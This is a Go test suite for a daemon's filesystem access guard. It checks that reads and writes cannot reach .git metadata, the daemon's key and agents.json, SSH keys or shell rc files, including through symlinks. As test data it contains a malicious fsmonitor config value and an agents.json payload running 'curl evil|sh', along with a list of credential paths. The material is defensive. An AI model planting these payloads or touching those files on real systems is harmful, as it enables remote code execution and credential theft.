package fsaccess

import (
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestResolveWithinRoot(t *testing.T) {
	root := t.TempDir()
	must(t, os.WriteFile(filepath.Join(root, "a.txt"), []byte("hi"), 0o644))
	g := New([]string{root})

	if _, err := g.Resolve(filepath.Join(root, "a.txt")); err != nil {
		t.Fatalf("in-root path rejected: %v", err)
	}
	if _, err := g.Resolve(filepath.Join(root, "sub", "new.txt")); err != nil {
		t.Fatalf("in-root new path rejected: %v", err)
	}
}

func TestResolveRejectsOutside(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	g := New([]string{root})

	if _, err := g.Resolve(filepath.Join(outside, "secret")); err == nil {
		t.Fatal("path outside roots was allowed")
	}
	if _, err := g.Resolve(filepath.Join(root, "..", filepath.Base(outside), "secret")); err == nil {
		t.Fatal("../ traversal escaped the root")
	}
}

func TestResolveRejectsSymlinkEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks differ on windows")
	}
	root := t.TempDir()
	outside := t.TempDir()
	must(t, os.WriteFile(filepath.Join(outside, "secret.txt"), []byte("top secret"), 0o644))
	link := filepath.Join(root, "escape")
	must(t, os.Symlink(outside, link))
	g := New([]string{root})

	// A path THROUGH the symlink resolves outside the root and must be rejected.
	if _, err := g.Resolve(filepath.Join(link, "secret.txt")); err == nil {
		t.Fatal("symlink escape was allowed")
	}
}

// TestResolveRefusesGitMetadata is the escalation this closes. A caller who could put one file into
// .git owned the machine: .git/config's core.fsmonitor / core.sshCommand / [alias] are strings git
// executes, and the daemon runs git in these repos on several ordinary actions. The file mode was
// never the protection — 0o644 defuses .git/hooks/* and nothing else.
func TestResolveRefusesGitMetadata(t *testing.T) {
	root := t.TempDir()
	must(t, os.MkdirAll(filepath.Join(root, ".git", "hooks"), 0o755))
	must(t, os.WriteFile(filepath.Join(root, ".git", "config"), []byte("[core]\n"), 0o644))
	must(t, os.MkdirAll(filepath.Join(root, ".hg"), 0o755))
	g := New([]string{root})

	refused := []string{
		filepath.Join(root, ".git", "config"),            // exists: the execution vector itself
		filepath.Join(root, ".git", "hooks", "pre-push"), // doesn't exist yet: the create case
		filepath.Join(root, ".git"),                      // the .git file/dir itself (worktree redirect)
		filepath.Join(root, "sub", ".git", "config"),     // nested repo, neither part existing
		filepath.Join(root, ".hg", "hgrc"),               // same shape, different VCS
	}
	for _, p := range refused {
		if _, err := g.Resolve(p); err == nil {
			t.Errorf("resolve allowed repository metadata: %s", p)
		} else if !errors.Is(err, ErrVCSMetadata) {
			t.Errorf("resolve(%s) refused for the wrong reason: %v", p, err)
		}
	}

	// The rule is about repository metadata, NOT about dots. These are ordinary project files and
	// must keep working — a prefix match rather than a path-component match would break every one.
	allowed := []string{
		filepath.Join(root, ".gitignore"),
		filepath.Join(root, ".gitmodules"),
		filepath.Join(root, ".github", "workflows", "ci.yml"),
		filepath.Join(root, ".env"),
		filepath.Join(root, ".claude", "settings.json"),
		filepath.Join(root, "git", "client.go"),
		filepath.Join(root, "ordinary.txt"),
	}
	for _, p := range allowed {
		if _, err := g.Resolve(p); err != nil {
			t.Errorf("resolve refused an ordinary file: %s: %v", p, err)
		}
	}
}

// TestWriteRefusesGitMetadata: the refusal reaches the actual write path, and is an ERROR rather
// than a silent no-op — a write that reported success while dropping the bytes would leave the
// client rendering content that doesn't exist on disk.
func TestWriteRefusesGitMetadata(t *testing.T) {
	root := t.TempDir()
	must(t, os.MkdirAll(filepath.Join(root, ".git"), 0o755))
	cfg := filepath.Join(root, ".git", "config")
	must(t, os.WriteFile(cfg, []byte("[core]\n"), 0o644))
	g := New([]string{root})

	evil := "[core]\n\tfsmonitor = \"touch /tmp/pwned\"\n"
	if _, conflict, err := g.Write(cfg, evil, ""); err == nil {
		t.Fatalf("write into .git succeeded (conflict=%v)", conflict)
	}
	if got, _ := os.ReadFile(cfg); string(got) != "[core]\n" {
		t.Fatalf(".git/config was modified: %q", got)
	}

	// An ordinary file in the same root still writes — the gate is the path, not the guard.
	ok := filepath.Join(root, "main.go")
	if _, conflict, err := g.Write(ok, "package main\n", ""); err != nil || conflict {
		t.Fatalf("ordinary write in the same root failed: conflict=%v err=%v", conflict, err)
	}
	if got, _ := os.ReadFile(ok); string(got) != "package main\n" {
		t.Fatalf("ordinary write not applied: %q", got)
	}
}

// TestResolveRefusesSymlinkedGitMetadata: the name can't be laundered out of the path by pointing a
// harmless-looking link at .git. Same defence as the escape test, one target closer in.
func TestResolveRefusesSymlinkedGitMetadata(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks differ on windows")
	}
	root := t.TempDir()
	must(t, os.MkdirAll(filepath.Join(root, ".git"), 0o755))
	must(t, os.Symlink(filepath.Join(root, ".git"), filepath.Join(root, "vcs")))
	g := New([]string{root})

	if _, err := g.Resolve(filepath.Join(root, "vcs", "config")); err == nil {
		t.Fatal("a symlink to .git got through")
	}
}

// TestRootInsideGitDirStillUsable pins the deliberate carve-out: the check is root-RELATIVE, so a
// root the owner registered that happens to live under a .git directory keeps working. Only walking
// INTO metadata from a root is refused.
func TestRootInsideGitDirStillUsable(t *testing.T) {
	base := t.TempDir()
	root := filepath.Join(base, ".git", "worktrees", "feature")
	must(t, os.MkdirAll(root, 0o755))
	g := New([]string{root})

	if _, err := g.Resolve(filepath.Join(root, "notes.txt")); err != nil {
		t.Fatalf("a root under .git should still be usable: %v", err)
	}
	// ...but descending into metadata from inside it is still refused.
	if _, err := g.Resolve(filepath.Join(root, "checkout", ".git", "config")); err == nil {
		t.Fatal("nested metadata under such a root was allowed")
	}
}

// fakeHome relocates HOME to a temp dir and lays out the parts of it that matter here: the daemon's
// state directory (key material + the exec'able agents.json), one session worktree inside it, an SSH
// key, and an ordinary project. It returns the home.
func fakeHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	t.Setenv("HOME", home)
	if runtime.GOOS == "windows" {
		t.Skip("home layout differs on windows")
	}
	must(t, os.MkdirAll(filepath.Join(home, ".oculus", "worktrees", "repo", "feature"), 0o755))
	must(t, os.WriteFile(filepath.Join(home, ".oculus", "daemon.key"), []byte("DEADBEEFPRIVATEKEY"), 0o600))
	must(t, os.WriteFile(filepath.Join(home, ".oculus", "agents.json"), []byte(`[{"command":"true"}]`), 0o600))
	must(t, os.MkdirAll(filepath.Join(home, ".ssh"), 0o700))
	must(t, os.WriteFile(filepath.Join(home, ".ssh", "id_ed25519"), []byte("PRIVATE KEY"), 0o600))
	must(t, os.WriteFile(filepath.Join(home, ".zshrc"), []byte("# rc\n"), 0o644))
	must(t, os.MkdirAll(filepath.Join(home, "code", "proj"), 0o755))
	return home
}

// TestResolveRefusesDaemonStateDir is the escalation this closes, at its narrowest: session.create
// is capSteer and took an arbitrary Cwd, every session cwd becomes an fs root, and fs.read/fs.write
// are capSteer — so a steerer read the daemon's private key (no forward secrecy: it decrypts every
// recorded session) and wrote agents.json, whose Command the daemon later exec's as the owner.
// The guard is constructed here with the state directory AS a root, because that is precisely the
// state the bug produced; the refusal must not depend on the roots being sane.
func TestResolveRefusesDaemonStateDir(t *testing.T) {
	home := fakeHome(t)
	state := filepath.Join(home, ".oculus")
	g := New([]string{state})

	key := filepath.Join(state, "daemon.key")
	if _, err := g.Resolve(key); err == nil {
		t.Fatal("resolve allowed the daemon's private key")
	} else if !errors.Is(err, ErrProtectedPath) {
		t.Fatalf("resolve(daemon.key) refused for the wrong reason: %v", err)
	}
	if f, err := g.Read(key); err == nil {
		t.Fatalf("read of daemon.key succeeded: %q", f.Content)
	}
	agents := filepath.Join(state, "agents.json")
	if _, _, err := g.Write(agents, `[{"command":"/bin/sh","args":["-c","curl evil|sh"]}]`, ""); err == nil {
		t.Fatal("write to agents.json succeeded")
	}
	if got, _ := os.ReadFile(agents); string(got) != `[{"command":"true"}]` {
		t.Fatalf("agents.json was modified: %q", got)
	}
	// Files that don't exist yet are refused too — approval rules and device records are created on
	// first use, so "not there yet" is the interesting case for a forger.
	for _, p := range []string{
		filepath.Join(state, "approval-rules.json"),
		filepath.Join(state, "worktree-setup-trust.json"),
		filepath.Join(state, "credentials.json"),
		filepath.Join(state, "sub", "dir", "anything"),
		state,
	} {
		if _, err := g.Resolve(p); !errors.Is(err, ErrProtectedPath) {
			t.Errorf("resolve(%s) should be refused as protected, got %v", p, err)
		}
	}
}

// TestWorktreesStayReachable pins the one carve-out. Every isolated session works inside
// ~/.oculus/worktrees/<repo>/<name>, so a blanket refusal of the state directory would have taken
// the worktree feature — and multi-repo workspaces — offline from the editor.
func TestWorktreesStayReachable(t *testing.T) {
	home := fakeHome(t)
	wt := filepath.Join(home, ".oculus", "worktrees", "repo", "feature")
	g := New([]string{wt})

	src := filepath.Join(wt, "main.go")
	if _, _, err := g.Write(src, "package main\n", ""); err != nil {
		t.Fatalf("write inside a session worktree failed: %v", err)
	}
	f, err := g.Read(src)
	if err != nil || f.Content != "package main\n" {
		t.Fatalf("read inside a session worktree failed: %+v %v", f, err)
	}
	// The carve-out is the worktrees subtree only — a sibling of it is still the state directory.
	if _, err := g.Resolve(filepath.Join(home, ".oculus", "daemon.key")); err == nil {
		t.Fatal("a worktree root reached back into the state directory")
	}
}

// TestResolveRefusesCredentialStores: a session cwd is attacker-chosen, so the same trick that named
// ~/.oculus names any other store of the owner's identity. Reads matter as much as writes here —
// ~/.ssh/id_ed25519 leaving the machine is the whole compromise — and ~/.zshrc is code, executed by
// the owner's next login shell and by the daemon's own `$SHELL -ilc` on the next restart.
func TestResolveRefusesCredentialStores(t *testing.T) {
	home := fakeHome(t)
	g := New([]string{home}) // the worst realistic case: the home directory itself is a root

	for _, p := range []string{
		filepath.Join(home, ".ssh", "id_ed25519"),
		filepath.Join(home, ".ssh", "authorized_keys"), // doesn't exist: appending one line is the attack
		filepath.Join(home, ".aws", "credentials"),
		filepath.Join(home, ".gnupg", "secring.gpg"),
		filepath.Join(home, ".kube", "config"),
		filepath.Join(home, ".config", "gh", "hosts.yml"),
		filepath.Join(home, "Library", "LaunchAgents", "com.evil.plist"),
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".netrc"),
	} {
		if _, err := g.Resolve(p); !errors.Is(err, ErrProtectedPath) {
			t.Errorf("resolve(%s) should be refused as protected, got %v", p, err)
		}
	}

	// ...and the list is not "no dotfiles" and not "nothing under ~/.config". A dotfiles repo is an
	// ordinary project: it is the LIVE locations that are refused, not files that happen to be named
	// like them. Breaking these would be a worse product for no security.
	for _, p := range []string{
		filepath.Join(home, "code", "proj", "main.go"),
		filepath.Join(home, "code", "proj", ".env"),
		filepath.Join(home, "dotfiles", ".zshrc"),
		filepath.Join(home, "dotfiles", ".ssh", "config"),
		filepath.Join(home, ".config", "nvim", "init.lua"),
		filepath.Join(home, ".gitconfig"),
	} {
		if _, err := g.Resolve(p); err != nil {
			t.Errorf("resolve refused an ordinary file: %s: %v", p, err)
		}
	}
}

// TestProtectedSurvivesSymlinks covers both directions of link, the way the .git rule does: a link
// INTO the state directory from an allowed root, and a state directory that is ITSELF a link, named
// by its real path so the literal ~/.oculus prefix never appears in the request.
func TestProtectedSurvivesSymlinks(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks differ on windows")
	}
	home := fakeHome(t)
	proj := filepath.Join(home, "code", "proj")

	// (a) An innocuous name inside a project pointing at the state directory.
	must(t, os.Symlink(filepath.Join(home, ".oculus"), filepath.Join(proj, "config")))
	g := New([]string{proj})
	if _, err := g.Resolve(filepath.Join(proj, "config", "daemon.key")); err == nil {
		t.Fatal("a symlink into the state directory got through")
	}

	// (b) The state directory relocated behind a link, addressed by its real path. HOME is moved to a
	// fresh dir so the rules are rebuilt against this layout.
	home2 := t.TempDir()
	t.Setenv("HOME", home2)
	real := filepath.Join(t.TempDir(), "state")
	must(t, os.MkdirAll(real, 0o755))
	must(t, os.WriteFile(filepath.Join(real, "daemon.key"), []byte("KEY"), 0o600))
	must(t, os.Symlink(real, filepath.Join(home2, ".oculus")))
	g2 := New([]string{real})
	if _, err := g2.Resolve(filepath.Join(real, "daemon.key")); !errors.Is(err, ErrProtectedPath) {
		t.Fatalf("the real path behind a linked state directory was allowed: %v", err)
	}
	if _, err := g2.Resolve(filepath.Join(home2, ".oculus", "daemon.key")); !errors.Is(err, ErrProtectedPath) {
		t.Fatalf("the link path to a linked state directory was allowed: %v", err)
	}
}

// TestNewDropsProtectedRoots: fs.search hands Guard.Roots() straight to ripgrep without resolving,
// so a protected root has to be gone from the set, not merely refused per path.
func TestNewDropsProtectedRoots(t *testing.T) {
	home := fakeHome(t)
	state := filepath.Join(home, ".oculus")
	wt := filepath.Join(state, "worktrees", "repo", "feature")
	proj := filepath.Join(home, "code", "proj")

	roots := New([]string{state, wt, proj}).Roots()
	// Roots come back symlink-resolved (on macOS a temp home is /var/… → /private/var/…), so compare
	// by shape rather than by the literal path this test built.
	for _, r := range roots {
		if strings.Contains(r, string(os.PathSeparator)+".oculus") && !strings.Contains(r, "worktrees") {
			t.Errorf("the state directory survived as a root: %v", roots)
		}
	}
	if len(roots) != 2 {
		t.Fatalf("expected the worktree and the project to survive, got %v", roots)
	}
}

// TestSearchSkipsProtected: Search is the one path that never calls Resolve, and its results quote
// file CONTENT back to the client — a grep for "PRIVATE" over a home root would have printed the
// key material itself.
func TestSearchSkipsProtected(t *testing.T) {
	home := fakeHome(t)
	must(t, os.WriteFile(filepath.Join(home, "code", "proj", "notes.txt"), []byte("DEADBEEFPRIVATEKEY appears here too\n"), 0o644))

	hits, err := Search("DEADBEEFPRIVATEKEY", []string{filepath.Join(home, ".oculus")}, false, 50)
	if err != nil {
		t.Fatal(err)
	}
	if len(hits) != 0 {
		t.Fatalf("search returned protected content: %+v", hits)
	}
	// Searching the home directory still works — it just never descends into the protected parts.
	hits, err = Search("DEADBEEFPRIVATEKEY", []string{home}, false, 50)
	if err != nil {
		t.Fatal(err)
	}
	for _, h := range hits {
		if strings.Contains(h.Path, filepath.Join(".oculus", "daemon.key")) {
			t.Fatalf("search reached the daemon key: %+v", h)
		}
	}
	if len(hits) == 0 {
		t.Fatal("search found nothing at all — the ordinary file should still match")
	}
}

func TestReadShaAndBinary(t *testing.T) {
	root := t.TempDir()
	must(t, os.WriteFile(filepath.Join(root, "t.txt"), []byte("hello"), 0o644))
	must(t, os.WriteFile(filepath.Join(root, "b.bin"), []byte{1, 2, 0, 3}, 0o644))
	g := New([]string{root})

	f, err := g.Read(filepath.Join(root, "t.txt"))
	if err != nil {
		t.Fatal(err)
	}
	if f.Content != "hello" || f.Sha == "" || f.Binary {
		t.Fatalf("unexpected read: %+v", f)
	}
	b, err := g.Read(filepath.Join(root, "b.bin"))
	if err != nil {
		t.Fatal(err)
	}
	if !b.Binary || b.Content != "" {
		t.Fatalf("binary not flagged: %+v", b)
	}

	// Invalid UTF-8 (no early NUL) is treated as binary so a save can't corrupt it.
	must(t, os.WriteFile(filepath.Join(root, "bad.txt"), []byte("ok \xff\xfe not utf8"), 0o644))
	u, err := g.Read(filepath.Join(root, "bad.txt"))
	if err != nil {
		t.Fatal(err)
	}
	if !u.Binary {
		t.Fatalf("invalid utf-8 not flagged binary: %+v", u)
	}
}

func TestWriteConflict(t *testing.T) {
	root := t.TempDir()
	p := filepath.Join(root, "c.txt")
	must(t, os.WriteFile(p, []byte("v1"), 0o644))
	g := New([]string{root})

	f, err := g.Read(p)
	if err != nil {
		t.Fatal(err)
	}
	// Someone else (the agent) writes concurrently, changing the on-disk sha.
	must(t, os.WriteFile(p, []byte("v2 from agent"), 0o644))

	_, conflict, err := g.Write(p, "v3 from user", f.Sha)
	if err != nil {
		t.Fatal(err)
	}
	if !conflict {
		t.Fatal("stale write should conflict")
	}
	if got, _ := os.ReadFile(p); string(got) != "v2 from agent" {
		t.Fatalf("conflicting write clobbered the file: %q", got)
	}

	// Re-read and write with the fresh sha succeeds.
	f2, _ := g.Read(p)
	res, conflict, err := g.Write(p, "v3 clean", f2.Sha)
	if err != nil || conflict {
		t.Fatalf("clean write failed: conflict=%v err=%v", conflict, err)
	}
	if got, _ := os.ReadFile(p); string(got) != "v3 clean" || res.Sha == "" {
		t.Fatalf("clean write not applied: %q", got)
	}
}

func TestTreeSortsAndSkips(t *testing.T) {
	root := t.TempDir()
	must(t, os.MkdirAll(filepath.Join(root, "node_modules"), 0o755))
	must(t, os.MkdirAll(filepath.Join(root, "src"), 0o755))
	must(t, os.WriteFile(filepath.Join(root, "z.txt"), []byte("z"), 0o644))
	g := New([]string{root})

	nodes, err := g.Tree(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(nodes) != 2 {
		t.Fatalf("expected 2 entries (node_modules skipped), got %d: %+v", len(nodes), nodes)
	}
	if !nodes[0].Dir || nodes[0].Name != "src" {
		t.Fatalf("dirs should sort first: %+v", nodes)
	}
	if nodes[1].Name != "z.txt" {
		t.Fatalf("unexpected file: %+v", nodes[1])
	}
}

func must(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatal(err)
	}
}
